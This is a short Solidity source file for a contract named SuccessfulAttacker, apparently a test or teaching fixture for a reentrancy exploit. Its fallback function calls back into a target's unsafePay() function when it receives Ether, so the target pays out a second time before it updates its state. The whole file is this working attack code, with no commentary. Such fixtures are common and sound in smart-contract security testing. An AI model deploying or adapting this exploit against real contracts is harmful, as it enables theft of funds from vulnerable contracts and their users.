pragma solidity ^0.4.24;

contract SuccessfulAttacker {
    bool public is_attack;
    address public payingAddress;

    constructor(address _payingAddress, bool _is_attack) {
        payingAddress = _payingAddress;
        is_attack = _is_attack;
    }

    function() public payable {
        emit Withdrawn(msg.sender, msg.value);
        if (is_attack == true) {
            is_attack = false;
            payingAddress.call(bytes4(sha3("unsafePay()")));
        }
    }

    function withdraw() {
        payingAddress.call(bytes4(sha3("unsafePay()")));
    }

    event Withdrawn(address indexed _from, uint256 _value);
}
